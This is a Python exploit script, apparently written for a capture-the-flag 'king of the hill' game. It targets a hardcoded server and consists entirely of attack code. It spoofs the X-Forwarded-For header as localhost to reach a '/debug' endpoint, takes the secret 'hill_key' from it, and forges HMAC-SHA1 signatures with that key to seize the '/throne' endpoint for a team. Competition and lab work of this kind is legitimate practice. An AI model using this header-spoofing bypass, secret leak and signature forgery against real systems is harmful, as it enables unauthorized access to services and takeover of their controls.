import requests, hmac, hashlib, time, email.utils, sys

B="http://13.37.197.230:28490"
TEAM="842d0f131b6b020f"
s=requests.Session()

def get_key():
    r=s.get(B+"/debug", headers={"X-Forwarded-For":"127.0.0.1"}, timeout=10)
    return r.json()["hill_key"]

def server_now():
    # sync to server clock via Date header to avoid skew
    r=s.get(B+"/status", timeout=10)
    d=r.headers.get("Date")
    if d:
        return int(email.utils.parsedate_to_datetime(d).timestamp())
    return int(time.time())

def sign(key, team, ts, as_bytes=False):
    k = bytes.fromhex(key) if as_bytes else key.encode()
    msg = f"{team}|{ts}".encode()
    return hmac.new(k, msg, hashlib.sha1).hexdigest()

def seize(key, as_bytes=False, ts=None):
    if ts is None: ts=server_now()
    sig=sign(key, TEAM, ts, as_bytes)
    r=s.post(B+"/throne", json={"team":TEAM,"ts":ts,"sig":sig}, timeout=10)
    return r.status_code, r.text, ts

if __name__=="__main__":
    key=get_key()
    print("hill_key =",key)
    # try key-as-string first
    code,body,ts=seize(key, as_bytes=False)
    print(f"[string key] ts={ts} -> {code}: {body}")
    if code!=200:
        code,body,ts=seize(key, as_bytes=True)
        print(f"[bytes key]  ts={ts} -> {code}: {body}")
    print("STATUS:", s.get(B+"/status").text)
